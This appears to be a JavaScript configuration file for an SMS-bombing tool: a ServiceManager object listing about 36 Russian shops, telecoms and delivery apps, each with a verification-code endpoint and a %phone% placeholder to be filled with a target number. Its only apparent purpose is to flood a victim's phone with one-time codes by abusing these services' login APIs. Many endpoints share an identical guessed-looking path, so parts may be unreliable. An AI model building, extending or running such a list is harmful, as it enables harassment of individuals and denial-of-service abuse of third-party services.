const ServiceManager = {
    getServices: function() {
        const uuid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => (Math.random()*16|0).toString(16));
        return [
            { name: "VkusVill", url: "https://mobile.vkusvill.ru/api/user/preGenerateVirtualCard/", method: "POST", headers: {"X-VKUSVILL-SOURCE": "6"}, body: "number=%phone%" },
            { name: "Tele2", url: "https://api.t2.ru/api/validation/number/%phone%", method: "POST", body: {"sender": "Tele2"} },
            { name: "4Lapy", url: "https://4lapy.ru/api/auth/newCode/", method: "POST", body: {"phone": "%phone%"} },
            { name: "Blanc", url: "https://blanc.ru/api/sso/v1/entrance/token", method: "POST", body: {"phoneNumber": "%phone%"} },
            { name: "StartRU", url: "https://api.start.ru/auth/v2/login", method: "POST", body: {"msisdn": "%phone%"} },
            { name: "MTS", url: "https://login.mts.ru/amserver/XUI/", method: "GET" },
            { name: "Beeline", url: "https://cdn.beeline.ru/app/inventory/v1/person/send-sms-code/", method: "POST", body: {"phone": "+%phone%"} },
            { name: "Megafon", url: "https://mi-pay.megafon.ru/api/v1/auth/send-code", method: "POST", body: {"msisdn": "%phone%"} },
            { name: "Dostavista", url: "https://dostavista.ru/api/v1/otp-send", method: "POST", body: {"phone": "%phone%"} },
            { name: "ZhisnMart", url: "https://lifemart.ru/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Samokat", url: "https://api.samokat.ru/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Lenta", url: "https://lenta.com/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Uteka", url: "https://uteka.ru/api/v1/auth/send-sms/", method: "POST", body: {"phone": "%phone%"} },
            { name: "YandexGo", url: "https://backend.taxi.yandex.ru/api/auth", method: "POST", body: {"phone": "+%phone%"} },
            { name: "AptekaRU", url: "https://api.apteka.ru/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "ZdravCity", url: "https://zdravcity.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Citilink", url: "https://www.citilink.ru/registration/confirm/phone/+%phone%/", method: "GET" },
            { name: "MVideo", url: "https://www.mvideo.ru/internal-api/auth/code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Eldorado", url: "https://www.eldorado.ru/auth/api/v1/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "BurgerKing", url: "https://burgerking.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "SberMarket", url: "https://sbermarket.ru/api/v2/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Pyaterochka", url: "https://5ka.ru/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Magnit", url: "https://magnit.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Ozon", url: "https://www.ozon.ru/api/composer-api.bx/proxy/init-auth", method: "POST", body: {"phone": "%phone%"} },
            { name: "Wildberries", url: "https://wildberries.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Sokolov", url: "https://sokolov.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Sunlight", url: "https://sunlight.net/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "GoldApple", url: "https://goldapple.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Letu", url: "https://www.letu.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "RiveGauche", url: "https://rivegauche.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "FixPrice", url: "https://fix-price.com/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "DetskyMir", url: "https://detmir.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "SportMaster", url: "https://sportmaster.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Ostin", url: "https://ostin.com/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "GloriaJeans", url: "https://gloria-jeans.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
            { name: "Funday", url: "https://funday.me/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} }
        ];
    }
};
